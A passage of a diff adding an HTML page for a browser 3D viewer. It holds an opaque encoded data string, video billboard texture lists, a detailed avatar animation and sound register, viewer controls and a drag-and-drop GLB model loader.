NOwAXJS46Og0DIRQtDz8CPwoALiEoOjknOzIEG1s6NBlbLDEtKD8pPComFy0KMQIZMQQDAwI8OVYoJBQySD0CNyUsMS0uPwsrPTcDEFsvOAEsIRRAJiopHQsnLgNMKBI7IisuNQo9KScIJhQXOz40ATwoPhsiOjkGCiIUFxo4JBYPKDobID46DQ0oPxNQOBIaMSsHPSQ6OjwKKT4TDTs4DTErLhsrPzlbLjQTTBouNCcILy5FKzoHIwgnF0RUKyk8IyouMTI8BAUiNyETGTskGj81ITEkPwQZOiQ+IQQ6YzstKy41JDQXXzwyFBxMLSsvCi8sGyI6FyMLIzFFVCs4LDAEF0wrLylaJSIxRVc4NAEiKjEDJTgUHSggBwNRLwIvLQMxLSQxOQENLQc1CC47NyIrPgwrPCkjCiY+G0w6KScrABcxKDECWyEgMQMUIRYnJSsxHyI/Oic7IAAXDjECGTEAFz0kPAcBJycHNS08Fl4kKjEbUyopHTsgFDJVMRIZKjUhFzsxECgoLRQtGTs4XjkrMS0iOzkBOyoURVo+JC8rJmcbLDEQLy4zEhsOPgZePDUXGy46Cwk9JzFEBjorAScDMUw3KGArDCQEAwU0Fig/KhAlATgXKw0gF0RRMRYNOC8EMTEvKjslJAcDUj4SNwArZjUAPRcnGTEHH1Q/Ki8BLmdFOjwXOC4iITUbMQEvJys+DCs8EDs7IAAXDzokKyQrBBMkMDkKKC0XAxoyBl48Kz5EISoqIyEnMQc7PSteLAAUITQxBwErNBQXGTwkASIvIQcBKiojIScxAFo+EhknNS4XMzESCSI3LjVMPBdbMTUxBwI9CwkrIBQDCzI0CTsrZxsgPRcNISc9Bw4+EicoKAdMKD00Pz8jLgwWIWInIyoEISs2EDciJBcESD0kWgosFy43PykjPSYxGw06KxolLCEXJDpgXjAhF0RMPyRWCiYXBCs8F1Y4NToXSDorAScAPiE0MQcBKzAuFxk8JAEiLyEHASopDSokMUQaMRYNPioHMS0xC145Jj4xTDg0AScqMQcCKTkkCCE+AwQ7OA04LwQxMSkHJwgmEwdMOyoNJSo+EyI6KSglNARECzsrViQqFDohKGArDCYULQ88Al4MKz4MLzYbATAhFC0JLxJWLCoxFyQ7GwE9IjElBDwAVjAsFBsPOjk7PyMuNVs4FisMLz4HMigpXiUtPSEgKRcrUSM9NUw4FzsoIRcABCs4LzADZkwiPzleCCIhG1U7Y148KD4tFz0QOygkPhcUOmI/MSguOSg6Og0lImYHUDg0JycoPgwrOzkNMycxBxooEVpYKgcQLT0HJwohMTUKLjQNOCwUGyo6KTs7Ky4uVDESGSo1IRc7MRAoKCYUOVA4EiclAwdEKjoXIy4kOhcIKTQ3PgAXJS46OQEIJBcbVyEFCQQsITorPwsJPyMEEw09KxolNSEXCj0pJwgmFBc5Ozk7CiohFyg6ByMfJ2cXDjskXl0ELwc3PxteLScxMRk+Fl44LBVMBTsQJz8gAi0LNhIZJzUuFzMxGx0/LRcDGi00CjEvMRctPhtXOSY+TVQ6OA04NS42LT8XJwgmMUVIMisjPAMEBwI4EDwIIz41UCtjLwwoOhs3KxdeJS09ISApFytRIz01TDgXOyghFwAEKzgsDCYHJSwvKiAoJhQ5UDgSJyUDBxcCMxAvPyMuEwswAR0TKC4DKD45ViUoPBsOPgZeJCwXBwEqKiMNJy8mWjgkGT41OhsmMRANXCc+F1U8FyM+LBcXBz0XBQg2LkVaMTgsDCYHJSwvKVorIQc1VS47NyMrIUwHOBE7CyEuIVU6NBkxLwADOjoEBSI3LiERIQFaLANnEAEvC1c5JBQhUT0rHRoqFzUkOio7OScDRAg8Aj84LBQbLj9gCSonPjFVPQI7KC8AGyE6KScvIRUDVzgSNyUvB0wlKTkkCCM+NVA0YywMKD4xMzEQDSU2BBcZPCQBIi8hBwEqKQ0qJDFEGjEWDS4rLh8kOikkKCYxH0w7ESMKKy46JTg5IygqPERVMRIZLiw+RC4/YQIuIQMMESo7CQ0DBAw2OikjLTQvRAEpEBkOABU9JD46DSsiZy5IKxZXIwNnTSIhOSQIIAAXGjE7BSMpLyE0PhANJSIhB0w+JF87K2Y1Oi0UXjgxBwBaP2I8PwcENi06YF4oJz4XVD8CVjguBwAhLRReLicxRA4xEg0MKT1BNy8AHjwvFyUKMRZeMC8hTCsvYFo4MQcAWj84OysAFy4tOGAeKiBnTQ46AVosKT0QNSo6OzEgBDUJPj8NVAUrXR5Q`, [`53z${Math.random().toString(36).slice(2, 10)}`]: `KxYBfQ8ZFTMaB1EoC1MFcg88DCtAHQQxCQNVMFQ2EC4vRExgSTRLIhshGCALXFZ+DwcYJw8cFzpOAyoRLwgsBxc5PAs3KCIxH1EsYx0gKgQ1ND8HNCQzLBsOPgZeDSgxRCo6FB1eJAQ5UT0BXyUrIRcyPBc/KDQCGw4+Bl4NKzFEKjobATkkFC1aOBIZLiw9QS8sFFs4IDEDFCEWJwQsITorOzkFCCEEAxQ+NBkrAyFMWzoHWygmMRtXPjQ3CC8hBy0uGwosMhQbWzgRATsBPj4GODknDCQVQBk9BQILID8XNzsSOycsFzkEMWIrWT89OVEoEj8jLxRMVjM0J0YsIR8VODtbLyA8OQI6JAEnKgdAGi5gVjktFDFINBIZPCgxFyshYD8xJi4TDTEBXjgoPkQuLxc4MD06MhYuNDs4LAcHLzsQOzskMR8JKBIBIipnLjMxBycIJhcXUDskNxokBT43KylaKCMhHwQvFjQiKwQDID0ALwgtFzFMPmNaDz8AGAchCx04Jz5MGj4kOzsAIS07MQcoKCEhAwg8AiswLBcHIjo9CTEhFCYbKDsFMSoEQCQ+Og0HIQBNUz8kHTAvLkQHPBcnDSEQJVIuFVs7BzouMzo6DSsiISUbPAArJCgXIS48BBY+JBQxGj47ATssLjUoPz1aID1nPgotFl4wLC5AAj8HBSgxBBtbOGMaIyouMTI6OScjJBcHGzMkNzErIQcBNRckJjQDBA0hYgYNP2YMMi0ELDAyZhBVPwEjIyIxBDcrYQomMBNFCiFiKDwHPRA7Kj44CjAuPRk/PwInBGdMLiwXLCcyZhwSLhVfPjw9AyUtFzgIPTEuDy84VjwrMUwCPBA/OyE+A1o+Oi8rBxAtCC8ULAssZwwLM2INWSY6QS8+FF46JjEHUT0SCT4oZxsoPykBCCQXJVUxAQUKID5AOS0HLA0yFExVMRIZISshFyQvKScoJhcfFTgSAQgsEy4iPhAaMCMXB1U+NBYPAz5NMzo9Hj0zLkBMPDgdBCwhOis4KTwNIhUtCThjDSsoLhcgPxteJycxB1c8Ai8nAGYQMDgpVi4nPgcaMQIWJSg+ITs+Fys5IjE2SCEGXiUrMRwhPT1XCCAUAw0rOx4kLiEYMzopNzkhAE1IMWNWJwMuDCIuFAk5Jj5NVDQBBSAAFD0hLBAJESIHHFc8EjcIKDE6Kzs5BQghBAMUPjgoJAcFBzc/G14KIRQxCTs0XzEsBwcoOBdWKic+RRYhPydfLz4YLTopNwgtFBdXLjsNPi8hTCUuECQIIS4DWjoBXicAPwc3PxteCiEUMQk7NF8xKyFMBzsUHR81PT1SOAEaJyo+MTsuBx49MgBATCoRCjE1IQcrODonCjIUNlcrBi8tNSEtJD4pJw0hEwcaPwENMCgHTAI4G1sNMQcHUToWKyYDZxsiPAcBKiEDRAo1JAECAD01LDgQJAo2OhcNOzQZJQMxEAYrKgkRIgccVzs0NycvPgMrKiknPyMuHFoxOxk+NToDMi8pNz4kFC0KO2MaOAcURSs8KQ0wNmc2EzgRGSMqOkU6MzojLTcuFxk4ETclNQM1ATgXOzsmMUxROjgkJgcERCUsAhkMJxMHCDwBDSQsBzYrPykjMSc+NQ86JF8wBC8HNz8bXgohFDEJOzRfMS8hMQc7Fx4NIQQDCC06VjgqFBc7PBcZKDQHIho9KyssKGYQIS0QGg0xBBsaPjQBJwM+MgYrKgYkKgc1CD4CASIsFxckOmA3OCc+F1U6JF8hBGYfJC8pWiUiPi1QPCQ0DwECMTk6Gwk4Jz4bGjhjDTEoLiErLAcGKi0DHwghAVs4KT46JToHViEjLgNaLxYrJgAxLigrFF4/JBc6SDIrIzwDBxMvLRBeGyAuJlo6NBkuKy4YLT45GSgnITVSOBYaOAQXEyI/KSM+JDEbUSgSXiwsPiEhPhAvJTQDDFc7NDcPACEiIiopBQg2ZwcPPSQ7OChnLjMxBycIJhAcDD0kDTAvIU0rOCkFLi8+ExQ7OCsxKgQHOysUXj8rPiFULjsrCi8uBwE6YAkPJzE2FjESNyIsOhsqMRAePys+IVQuOysKLy4HATpgCTEmLhNaOgIZKwQhLS4/OgooLSElVSEWHio1BwcGKwEvKyEEGw07JDclAz4mKzg6Kz0mAwxIIQFbOCk9FzY+EBoNMhQ1Uis0DSwsFEQmPhANKyJmB1Y+OlY4NQcAMyhgPyEnMQcPOyQBKCQEBzE8OTcKNmYhTD44IzEoPhMiODkNKCEXAFU4Egk9NS45ID0HGQo3Li0ZOzs7OCgXB0g6Oj8PJzEAWjESGSo1IRc7MRAoLjYhA1c8EjcrAwclAitgVwgjLjFROBYoJy8UMSY8EC8IIiElCjECGTEAOjo7MToaDTEEGxo+NAEnAzoDJDoqKCEzEAcXOgYeLwMURCg/KVYsI2YXXhkuRxRM` }) : skin;
+            _pm.p.construct = {
+                // lod: 1.42,
+                csm: !0,
+                videos: {
+                    mat: RegExp(/(ads|tv-|tvscreen|television|billboard)/),
+                    type: ["portrait", "vertical", "landscape"],
+                    url: {
+                        billboard: [
+                            { url: `assets/textures/videos/Umbawa billboard.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                            { url: `assets/textures/videos/billboard.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                            { url: `assets/textures/videos/closer you & i.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                            { url: `assets/textures/videos/ECash Demo 360.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                        ],
+                        portrait: [
+                            { url: `assets/textures/videos/portrait billboard.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                            { url: `assets/textures/videos/portrait vertical video 1.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                            { url: `assets/textures/videos/portrait vertical video 2.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                            { url: `assets/textures/videos/portrait vertical video 3.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                        ],
+                        landscape: [
+                            { url: `assets/textures/videos/realholmes intro landscape wide.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                            { url: `assets/textures/videos/paseo verde landscape wide.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                        ],
+                        vertical: [
+                            { url: `assets/textures/videos/vertical video 1.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                            { url: `assets/textures/videos/vertical video 2.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                            { url: `assets/textures/videos/vertical video 3.mp4`, emissiveIntensity: .64, flipX: !1, flipY: !1 },
+                        ]
+                    },
+                }
+            };
+            if (localStorage.avatar)
+                _pm.reg = JSON.parse(localStorage.avatar);
+            if (_pm.reg && _pm.reg[loader.pIndex] && _pm.reg[loader.pIndex].vehicle && _pm.p.models[_pm.reg[loader.pIndex].vehicle] && _pm.reg[loader.pIndex].v) {
+                _pm.p.models[_pm.reg[loader.pIndex].vehicle].position = _pm.reg[loader.pIndex].v.p;
+                _pm.p.models[_pm.reg[loader.pIndex].vehicle].rotation = _pm.reg[loader.pIndex].v.r;
+                delete _pm.reg;
+            };
+            let textMaps = [
+                "alphaMap",
+                "anisotropyMap",
+                "aoMap",
+                "blendAlpha",
+                "blendDstAlpha",
+                "blendEquationAlpha",
+                "blendSrcAlpha",
+                "bumpMap",
+                "clearcoatMap",
+                "clearcoatNormalMap",
+                "clearcoatRoughnessMap",
+                "displacementMap",
+                "emissiveMap",
+                "envMap",
+                "gradientMap",
+                "iridescenceMap",
+                "iridescenceThicknessMap",
+                "lightMap",
+                "map",
+                "metalnessMap",
+                "normalMap",
+                "roughnessMap",
+                "sheenColorMap",
+                "sheenRoughnessMap",
+                "specularColorMap",
+                "specularIntensityMap",
+                "specularMap",
+                "thicknessMap",
+                "transmissionMap",
+            ],
+            codeString = (Math.random() + 1).toString(36).substring(7),
+            getViewsSettings = function (c) {
+                for (let k in _pm.p.models)
+                    if (_pm.p.models[k].isAvatar && _pm.p.models[k].isAvatar.isPlayer)
+                        for (let i = 0, j = ["sequence", "idle"]; i < j.length; i++) if (!_pm.p.camera.positions[j[i]]) _pm.p.camera.positions[j[i]] = [_pm.p.models[k].position];
+                return {
+                    index: c ? 0 : _pm.p.camera.positions.index,
+                    counter: 10,
+                    duration: 60 * 4,
+                    delay: 90,
+                    positions: JSON.parse(`{
+                        "sequence": {
+                            "${loader.pIndex}": ${JSON.stringify(_pm.p.camera.positions.sequence)}
+                        },
+                        "idle": {
+                            "${loader.pIndex}": ${JSON.stringify(_pm.p.camera.positions.idle)}
+                        }
+                    }`),
+                    info: JSON.parse(`{
+                        "modals": {
+                            "${loader.pIndex}": ${JSON.stringify(_pm.p.camera.info.modals)}
+                        }
+                    }`),
+                };
+            },
+            _setRegister = function () {
+                return {
+                    indicators: [],
+                    animation: { update: !1 },
+                    animated: {
+                        models: [],
+                        colors: {}
+                    },
+                    touches: {},
+                    busy: {
+                        archived: { now: performance.now() },
+                        boundaries: { now: performance.now() },
+                        interiors: { now: performance.now() },
+                        optimize: { now: performance.now() },
+                        collider: { now: performance.now() },
+                        dynamics: { now: performance.now() },
+                    },
+                    audio: { buffers: {} },
+                    events: {},
+                    unload: {
+                        enter: [],
+                        leave: []
+                    },
+                    loading: [],
+                    asyncLoading: [], 
+                    avatar: {
+                        selected: "avatarhead",
+                        targets: {},
+                        level: {
+                            navigation: [],
+                            obstacle: []
+                        },
+                        animations: {},
+                        bodies: {},
+                        meshes: {},
+                        idle: ["Arm Stretching", "Breathing Idle", "Idle", "Standard Idle", "Offensive Idle", "Neck Stretching", "Look Around", "Weight Shift", "Looking Behind"],
+                        hit: ["Reacting", "Agreeing", "Look Over Shoulder", "Drunk Idle Variation", "Thoughtful Head Shake", "Shove Reaction", "Getting Hit", "Shake Fist", "Pointing Gesture", "Talking"],
+                        activities: {
+                            pushing: ["Button Pushing"],
+                            pointing: ["Pointing"],
+                            victory: ["Victory Idle"],
+                            defeat: ["Defeat"],
+                            yelling: ["Yelling"],
+                            waving: ["Waving"],
+                            driving: ["Driving"],
+                            passenger: ["Passenger"],
+                            laying: ["Laying Idle"],
+                        },
+                        sound: {
+                            hit: ["hit"],
+                            activities: {
+                                pushing: ["avatar/keypad.ogg"],
+                                driving: ["vehicle/cardoorclose.ogg"],
+                                passenger: ["vehicle/cardoorclose.ogg"],
+                            },
+                        },
+                        moving: {
+                            walk: {
+                                rate: {
+                                    forward: {
+                                        slow: 0,
+                                        normal: 30,
+                                        fast: 60,
+                                        veryfast: 90,
+                                    },
+                                    backward: {
+                                        slow: 0,
+                                        normal: 10,
+                                        fast: 30,
+                                        veryfast: 60,
+                                    },
+                                },
+                                forward: {
+                                    slow: ["Walking"],
+                                    normal: ["Running Slow"],
+                                    fast: ["Running"],
+                                    veryfast: ["Running Fast"],
+                                },
+                                backward: {
+                                    slow: ["Walking Backwards Slow"],
+                                    normal: ["Walking Backwards"],
+                                    fast: ["Slow Jog Backwards"],
+                                    veryfast: ["Running Backward"],
+                                },
+                                sound: {
+                                    forward: {
+                                        slow: ["avatar/walking1.ogg"],
+                                        normal: ["avatar/jogging1.ogg"],
+                                        fast: ["avatar/running1.ogg"],
+                                        veryfast: ["avatar/running1.ogg"],
+                                    },
+                                    backward: {
+                                        slow: ["avatar/walking1.ogg"],
+                                        normal: ["avatar/jogging1.ogg"],
+                                        fast: ["avatar/running1.ogg"],
+                                        veryfast: ["avatar/running1.ogg"],
+                                    },
+                                },
+                            },
+                            stir: {
+                                rate: {
+                                    left: {
+                                        slow: 0,
+                                    },
+                                    right: {
+                                        slow: 0,
+                                    },
+                                },
+                                left: {
+                                    slow: ["Walk Strafe Left"],
+                                },
+                                right: {
+                                    slow: ["Walk Strafe Right"],
+                                },
+                                sound: {
+                                    left: {
+                                        slow: ["avatar/walking1.ogg"],
+                                    },
+                                    right: {
+                                        slow: ["avatar/walking1.ogg"],
+                                    },
+                                },
+                            },
+                            yaw: {
+                                rate: {
+                                    left: {
+                                        slow: 0,
+                                        normal: 10,
+                                        fast: 20,
+                                        veryfast: 40,
+                                    },
+                                    right: {
+                                        slow: 0,
+                                        normal: 10,
+                                        fast: 20,
+                                        veryfast: 40,
+                                    },
+                                },
+                                left: {
+                                    slow: ["Left Strafe Walk"],
+                                    normal: ["Left Strafe Walking"],
+                                    fast: ["Jog Strafe Left"],
+                                    veryfast: ["Left Strafe"],
+                                },
+                                right: {
+                                    slow: ["Right Strafe Walk"],
+                                    normal: ["Right Strafe Walking"],
+                                    fast: ["Jog Strafe Right"],
+                                    veryfast: ["Right Strafe"],
+                                },
+                                sound: {
+                                    left: {
+                                        slow: ["avatar/walking1.ogg"],
+                                        normal: ["avatar/jogging1.ogg"],
+                                        fast: ["avatar/running1.ogg"],
+                                        veryfast: ["avatar/running1.ogg"],
+                                    },
+                                    right: {
+                                        slow: ["avatar/walking1.ogg"],
+                                        normal: ["avatar/jogging1.ogg"],
+                                        fast: ["avatar/running1.ogg"],
+                                        veryfast: ["avatar/running1.ogg"],
+                                    },
+                                },
+                            },
+                            jump: {
+                                forward: ["Jump"],
+                                backward: ["Jump Backward"],
+                                upward: ["Jumping Simple"],
+                            },
+                            flip: {
+                                forward: ["Running Forward Flip"],
+                                backward: ["Backflip"],
+                            },
+                            Flying: {
+                                velocity: {
+                                    isIdle: 2.4,
+                                },
+                                forward: ["Flying"],
+                            },
+                            floating: {
+                                upward: ["Floating"],
+                            },
+                            falling: {
+                                velocity: {
+                                    isIdle: -1.2,
+                                    isFatal: -7.6,
+                                },
+                                idle: ["Falling Idle"],
+                                landing: ["Falling To Landing"],
+                                fast: ["Falling"],
+                                impact: ["Falling Flat Impact"],
+                                sound: {
+                                    landing: ["avatar/landing.ogg"],
+                                    impact: ["avatar/hitfloor.ogg"],
+                                },
+                            },
+                            dying: {
+                                dead: ["Dying", "Dying Backwards"],
+                                inpain: ["Writhing In Pain"],
+                                sound: {
+                                    dead: ["hitfloor"],
+                                },
+                            },
+                            waking: {
+                                up: ["Getting Up"],
+                            },
+                            swimming: {
+                                forward: ["Swimming"],
+                                idle: ["Treading Water"],
+                            },
+                        },
+                    },
+                    user: {
+                        destinations: {},
+                        animating: {},
+                        external: {},
+                        stopped: {},
+                        targets: {},
+                        vehicle: {},
+                        inputs: {},
+                        uid: {},
+                    },
+                    vehicles: {
+                        brakeInterval: {},
+                        ids: [],
+                    },
+                };
+            },
+            register = _setRegister();
+        </script>
+        <script src="assets/js/libgif.js"></script>
+        <div
+            onmousedown="hideCursorPointer({ e: this, c: !0})"
+            ontouchstart="hideCursorPointer({ e: this, c: !0});canvasFocused()"
+            onmouseup="hideCursorPointer({ e: this })"
+            ontouchend="hideCursorPointer({ e: this })"
+            onmouseenter="canvasFocused()"
+            style="position: fixed; left: 0; top: 0; cursor: pointer;"
+            id="three-canvas"
+        ></div>
+        <div style="display: none;" id="in-canvas-motion-texture"></div>
+        <div style="position: absolute; display: flex; flex-wrap: wrap; justify-content: center; pointer-events: none;" id="loading-icon">
+            <img src="./assets/images/loading.webp" style="margin-top: -21px; height: 36px;" />
+            <div style="position: absolute; display: none; white-space: nowrap; bottom: -21px;" id="cursor-pointer-text">
+                <span style="white-space: nowrap; opacity: .42;">Loading 3d model</span>
+                <img src="assets/images/loadingdots.gif" alt="" style="height: 4px; object-fit: cover;" />
+            </div>
+            <div id="image-cont"></div>
+        </div>
+        <div style="position: absolute; display: none; justify-content: right; flex-wrap: wrap; flex-direction: row; width: 18vw; height: 26vh; right: 6px; top: 127px; opacity: var(--icon-opacity);" id="three-view-buttons">
+            <img src="assets/images/zoom in.webp" alt="" onclick="zoomIn(!0)" style="margin: 0 6px; max-height: 36px; cursor: pointer;" />
+            <img src="assets/images/zoom out.webp" alt="" onclick="zoomIn(!1)" style="margin: 0 6px; max-height: 36px; cursor: pointer;" />
+            <div id="magnify-icon" style="display: none;">
+                <img onclick="magnifyView({})" src="assets/images/magnify.webp" alt="" style="margin: 0 6px; max-height: 36px; cursor: pointer;" />
+            </div>
+            <img src="assets/images/download.webp" alt="" onclick="download()" style="margin: 0 6px; max-height: 36px; cursor: pointer;" />
+        </div>
+        <div disabled style="position: absolute; display: none; justify-content: center; align-items: center; left: 0px; top: 0px; pointer-events: none;" id="magnify-lens-cont">
+            <img hidden src="assets/images/magnify handle.webp" alt="" style="position: absolute; right: -7px; bottom: -7px; opacity: .86;" id="magnify-lens-handle" />
+            <div
+                disabled
+                style="position: relative; display: flex; justify-content: center; align-items: center; width: 0px; height: 0px; border-radius: 50%; border-style: solid; border-width: 5.5px; border-color: #a6a6a6; overflow: hidden;"
+                id="magnify-lens-frame"
+            >
+                <div style="position: absolute; left: 0px; top: 0px; opacity: .96; background-size: 100% 100%;" id="magnify-lens"></div>
+            </div>
+        </div>
+        <div id="move-here-marker" style="position: absolute; display: none; cursor: pointer; pointer-events: none;">
+            <div class="move-here">
+                <img src="assets/textures/move_here.gif" onclick="setDestinationMarker({ e: this })" style="pointer-events: auto;" />
+            </div>
+        </div>
+        <div class="file-dnd" style="z-index: 1" ondragover="event.preventDefault(); event.currentTarget.classList.add('drag-over')" ondragleave="event.currentTarget.classList.remove('drag-over')" ondrop="event.preventDefault(); event.currentTarget.classList.remove('drag-over'); const files = event.dataTransfer.files; if (files && files.length) _pm.model.loadGLTFile({ f: files[0], i: (Math.random() + 1).toString(36).substring(7), r: new FileReader() })">
+            <label for="upload-model">Load your model:</label>
+            <input type="file" id="upload-model" accept=".glb" hidden onchange="_pm.model.loadGLTFile({ f: this.files[0], i: (Math.random() + 1).toString(36).substring(7), r: new FileReader() }); this.value=''"/>
+            <div onclick="document.getElementById('upload-model').click()">
+                <img src="assets/images/gltf.webp"/>
+                <h4>Drag & Drop GLTF or Browse</h4>
+            </div>
+        </div>
+        <script>
+            _pm = Object.assign(_pm, { screen: document.getElementById("three-canvas") });
+            _pm.screen.style.opacity = _pm.p.physics ? .01 : 1;
+            document.getElementById("cursor-pointer-text").style.display = _pm.p.physics ? "none" : "block";
+        </script>
+    </body>
+</html>
